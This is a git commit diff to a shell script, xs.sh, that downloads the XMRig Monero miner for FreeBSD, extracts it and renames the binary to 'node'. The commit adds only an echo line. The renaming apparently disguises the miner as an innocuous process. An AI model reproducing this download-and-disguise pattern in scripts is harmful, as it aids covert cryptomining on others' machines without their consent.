5d2b4371e190587a95623cfcb55772255dcbf700
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-16 11:45:35 +0700

    Update xs.sh

--- xs.sh
+++ xs.sh
@@ -3,3 +3,4 @@ mkdir xmr/focal
 wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-freebsd-static-x64.tar.gz
 tar -xvf xmrig-6.25.0-freebsd-static-x64.tar.gz
 mv xmrig-6.25.0/xmrig xmr/freebsd/node
+echo freebsd
